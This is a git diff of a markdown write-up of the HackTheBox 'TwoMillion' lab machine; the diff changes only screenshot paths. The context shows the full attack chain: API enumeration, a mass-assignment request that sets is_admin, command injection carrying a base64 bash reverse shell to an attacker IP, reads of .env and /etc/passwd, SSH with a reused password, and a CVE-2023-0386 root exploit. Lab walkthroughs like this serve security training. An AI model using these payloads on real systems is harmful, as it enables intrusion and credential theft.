@@ -105,7 +105,7 @@ The overall attack path moved from an exposed, undocumented API through a mass-a
 sudo nmap -sC -sV -Pn 10.129.229.66
 ```
 
-![Nmap scan results](screenshots/Pasted_image_20260920181034.png)
+![Nmap scan results](./images/Pasted_image_20260920181034.png)
 
 **Findings:** Two open ports — `22/tcp` (OpenSSH 8.9p1 Ubuntu) and `80/tcp` (nginx). The HTTP service did not follow its redirect, revealing the virtual host `2million.htb`.
 
@@ -117,8 +117,8 @@ echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
 
 The site is a recreation of the HackTheBox landing page, with `[join]` and `[login]` links. Clicking "join" routes to `/invite`, which requires an invite code to register.
 
-![2million.htb landing page](screenshots/Pasted_image_20260920181258.png)
-![Invite code entry page](screenshots/Pasted_image_20260920181601.png)
+![2million.htb landing page](./images/Pasted_image_20260920181258.png)
+![Invite code entry page](./images/Pasted_image_20260920181601.png)
 
 ### 1.3. Enumeration — Deobfuscating the Invite API
 
@@ -153,7 +153,7 @@ function makeInviteCode() {
 curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
 ```
 
-![API hint response](screenshots/Pasted_image_20260920182613.png)
+![API hint response](./images/Pasted_image_20260920182613.png)
 
 The response's `data` field is ROT13-encoded, decoding to: *"In order to generate the invite code, make a POST request to /api/v1/invite/generate"*.
 
@@ -161,7 +161,7 @@ The response's `data` field is ROT13-encoded, decoding to: *"In order to generat
 curl -sX POST http://2million.htb/api/v1/invite/generate | jq
 ```
 
-![Generated invite code](screenshots/Pasted_image_20260920183056.png)
+![Generated invite code](./images/Pasted_image_20260920183056.png)
 
 ```bash
 echo TzBWTEYtM1pYQ0ktSldRVjMtN1ZRSk8= | base64 -d
@@ -170,24 +170,24 @@ echo TzBWTEYtM1pYQ0ktSldRVjMtN1ZRSk8= | base64 -d
 
 The decoded code was submitted on `/invite`, redirecting successfully to `/register`.
 
-![Registration page with valid invite code](screenshots/Pasted_image_20260920183313.png)
+![Registration page with valid invite code](./images/Pasted_image_20260920183313.png)
 
 A user was registered with username `test`, email `test@2million.htb`, and a throwaway password, then logged into the dashboard.
 
-![Registration success](screenshots/Pasted_image_20260920183503.png)
-![Authenticated dashboard](screenshots/Pasted_image_20260920183602.png)
+![Registration success](./images/Pasted_image_20260920183503.png)
+![Authenticated dashboard](./images/Pasted_image_20260920183602.png)
 
 ### 1.5. Enumeration — Mapping the Authenticated API
 
 Intercepting the "Connection Pack" button on the VPN access page in Burp Suite showed a `GET /api/v1/user/vpn/generate` request, along with a valid `PHPSESSID` cookie.
 
-![Burp Suite intercepted VPN generate request](screenshots/Pasted_image_20260920183826.png)
+![Burp Suite intercepted VPN generate request](./images/Pasted_image_20260920183826.png)
 
 ```bash
 curl -v 2million.htb/api
 ```
 
-![401 Unauthorized without a session cookie](screenshots/Pasted_image_20260920184110.png)
+![401 Unauthorized without a session cookie](./images/Pasted_image_20260920184110.png)
 
 Supplying the captured `PHPSESSID` cookie:
 
@@ -195,13 +195,13 @@ Supplying the captured `PHPSESSID` cookie:
 curl -sv 2million.htb/api --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
 ```
 
-![Authenticated API root response](screenshots/Pasted_image_20260920184326.png)
+![Authenticated API root response](./images/Pasted_image_20260920184326.png)
 
 ```bash
 curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
 ```
 
-![Full API route listing](screenshots/Pasted_image_20260920184518.png)
+![Full API route listing](./images/Pasted_image_20260920184518.png)
 
 **Findings:** The route list exposed several administrative endpoints, including `/api/v1/admin/auth`, `/api/v1/admin/vpn/generate`, and `/api/v1/admin/settings/update` (PUT).
 
@@ -211,13 +211,13 @@ curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | j
 curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
 ```
 
-![admin/auth returns false](screenshots/Pasted_image_20260920184648.png)
+![admin/auth returns false](./images/Pasted_image_20260920184648.png)
 
 ```bash
 curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu"
 ```
 
-![401 Unauthorized on admin VPN generate](screenshots/Pasted_image_20260920184914.png)
+![401 Unauthorized on admin VPN generate](./images/Pasted_image_20260920184914.png)
 
 ### 1.7. Exploitation — Mass Assignment to Gain Admin (Finding #3)
 
@@ -225,34 +225,34 @@ curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3
 curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
 ```
 
-![Missing email parameter error](screenshots/Pasted_image_20260920185135.png)
+![Missing email parameter error](./images/Pasted_image_20260920185135.png)
 
 ```bash
 curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
   --header "Content-Type: application/json" --data '{"email":"test@2million.htb"}' | jq
 ```
 
-![Missing is_admin parameter error](screenshots/Pasted_image_20260920185443.png)
+![Missing is_admin parameter error](./images/Pasted_image_20260920185443.png)
 
 ```bash
 curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
   --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": true}' | jq
 ```
 
-![is_admin must be 0 or 1 error](screenshots/Pasted_image_20260920190508.png)
+![is_admin must be 0 or 1 error](./images/Pasted_image_20260920190508.png)
 
 ```bash
 curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
   --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": 1}' | jq
 ```
 
-![is_admin successfully set to 1](screenshots/Pasted_image_20260920190618.png)
+![is_admin successfully set to 1](./images/Pasted_image_20260920190618.png)
 
 ```bash
 curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
 ```
 
-![admin/auth now returns true](screenshots/Pasted_image_20260920190753.png)
+![admin/auth now returns true](./images/Pasted_image_20260920190753.png)
 
 **Findings:** The account settings endpoint accepted an attacker-controlled `is_admin` field with no server-side authorization check, elevating the `test` account to administrator.
 
@@ -263,14 +263,14 @@ curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2u
   --header "Content-Type: application/json" | jq
 ```
 
-![Missing username parameter](screenshots/Pasted_image_20260920192813.png)
+![Missing username parameter](./images/Pasted_image_20260920192813.png)
 
 ```bash
 curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
   --header "Content-Type: application/json" --data '{"username":"test"}'
 ```
 
-![Valid OVPN configuration returned for username test](screenshots/Pasted_image_20260920193123.png)
+![Valid OVPN configuration returned for username test](./images/Pasted_image_20260920193123.png)
 
 Testing for command injection in the `username` parameter:
 
@@ -279,7 +279,7 @@ curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2u
   --header "Content-Type: application/json" --data '{"username":"test;id;"}'
 ```
 
-![id command output confirms command injection](screenshots/Pasted_image_20260920193446.png)
+![id command output confirms command injection](./images/Pasted_image_20260920193446.png)
 
 A netcat listener was started, and a base64-encoded reverse shell payload was injected:
 
@@ -298,7 +298,7 @@ curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2u
   --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvMTIzNCAwPiYx | base64 -d | bash;"}'
 ```
 
-![Reverse shell caught as www-data](screenshots/Pasted_image_20260920194024.png)
+![Reverse shell caught as www-data](./images/Pasted_image_20260920194024.png)
 
 **Findings:** The `username` field was passed unsanitized into a shell command (likely via `exec`/`system` when building the OpenVPN client config), enabling arbitrary OS command execution as `www-data`.
 
@@ -309,7 +309,7 @@ ls -la
 cat .env
 ```
 
-![.env file with database credentials](screenshots/Pasted_image_20260920194134.png)
+![.env file with database credentials](./images/Pasted_image_20260920194134.png)
 
 ```
 DB_HOST=127.0.0.1
@@ -322,7 +322,7 @@ DB_PASSWORD=SuperDuperPass123
 cat /etc/passwd
 ```
 
-![/etc/passwd showing admin user with a bash shell](screenshots/Pasted_image_20260920194312.png)
+![/etc/passwd showing admin user with a bash shell](./images/Pasted_image_20260920194312.png)
 
 The `DB_PASSWORD` was reused successfully to SSH in as the local `admin` user:
 
@@ -332,7 +332,7 @@ whoami
 cat user.txt
 ```
 
-![SSH access as admin and user.txt flag](screenshots/Pasted_image_20260920194507.png)
+![SSH access as admin and user.txt flag](./images/Pasted_image_20260920194507.png)
 
 **User flag:** `687c1f2b36c2432616aad2e70ae864e9`
 
@@ -344,7 +344,7 @@ ls
 cat admin
 ```
 
-![Internal email referencing an unpatched OverlayFS/FUSE kernel CVE](screenshots/Pasted_image_20260920194742.png)
+![Internal email referencing an unpatched OverlayFS/FUSE kernel CVE](./images/Pasted_image_20260920194742.png)
 
 The email from `ch4p` to `admin` (cc: `g0blin`) explicitly flags that the host has not been patched against a recent OverlayFS/FUSE kernel vulnerability — [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386).
 
@@ -352,13 +352,13 @@ The email from `ch4p` to `admin` (cc: `g0blin`) explicitly flags that the host h
 uname -a
 ```
 
-![Kernel version 5.15.70-051570-generic](screenshots/Pasted_image_20260920195047.png)
+![Kernel version 5.15.70-051570-generic](./images/Pasted_image_20260920195047.png)
 
 ```bash
 lsb_release -a
 ```
 
-![Ubuntu 22.04.2 LTS (Jammy)](screenshots/Pasted_image_20260920195146.png)
+![Ubuntu 22.04.2 LTS (Jammy)](./images/Pasted_image_20260920195146.png)
 
 **Findings:** The host runs kernel `5.15.70` on Ubuntu 22.04 (Jammy), within the range of kernel versions vulnerable to CVE-2023-0386 (fixed versions for Jammy start at `5.15.0-71.78` and later).
 
@@ -384,7 +384,7 @@ make all
 ./exp
 ```
 
-![Exploit succeeds, dropping to a root shell](screenshots/Pasted_image_20260920200134.png)
+![Exploit succeeds, dropping to a root shell](./images/Pasted_image_20260920200134.png)
 
 **Findings:** The exploit abuses a permission-check flaw in the interaction between OverlayFS and FUSE filesystems to escalate from the unprivileged `admin` user directly to `root`.
 
@@ -396,7 +396,7 @@ cat root.txt
 cat thank_you.json
 ```
 
-![root.txt flag and thank_you.json contents](screenshots/Pasted_image_20260920200210.png)
+![root.txt flag and thank_you.json contents](./images/Pasted_image_20260920200210.png)
 
 **Root flag:** `e5dd8ba5fefbc4d789cb671a6140d248`
 
@@ -426,7 +426,7 @@ curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=..." \
 → uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-`screenshots/Pasted_image_20260920193446.png` — command injection PoC returning `id` output inline with the VPN config generation response.
+`./images/Pasted_image_20260920193446.png` — command injection PoC returning `id` output inline with the VPN config generation response.
 
 ---
 
@@ -452,7 +452,7 @@ root@2million:/tmp/CVE-2023-0386# whoami
 root
 ```
 
-`screenshots/Pasted_image_20260920200134.png` — root shell obtained via the CVE-2023-0386 PoC.
+`./images/Pasted_image_20260920200134.png` — root shell obtained via the CVE-2023-0386 PoC.
 
 > **Note on CVEs:** This finding maps directly to a known, publicly disclosed CVE in a versioned third-party component (the Linux kernel), so a CVE identifier is included above.
 
@@ -480,7 +480,7 @@ PUT /api/v1/admin/settings/update
 GET /api/v1/admin/auth → {"message": true}
 ```
 
-`screenshots/Pasted_image_20260920190618.png`, `screenshots/Pasted_image_20260920190753.png`
+`./images/Pasted_image_20260920190618.png`, `./images/Pasted_image_20260920190753.png`
 
 ---
 
@@ -506,7 +506,7 @@ DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
 
-`screenshots/Pasted_image_20260920194134.png`, `screenshots/Pasted_image_20260920194507.png`
+`./images/Pasted_image_20260920194134.png`, `./images/Pasted_image_20260920194507.png`
 
 ---
 
